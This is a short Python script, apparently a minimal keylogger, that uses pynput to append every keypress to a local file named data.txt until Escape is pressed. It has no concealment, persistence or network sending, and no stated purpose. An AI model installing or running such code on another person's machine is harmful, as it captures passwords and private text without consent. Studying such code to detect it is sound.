from pynput.keyboard import Key, Listener

def on_press(key):
    with open("data.txt", "a") as f:
        try:
            f.write(f"{key.char}\n")
        except AttributeError:
            f.write(f"{key}\n")

    if key == Key.esc:
        exit(0)

with Listener(on_press=on_press) as listener:
    listener.join()
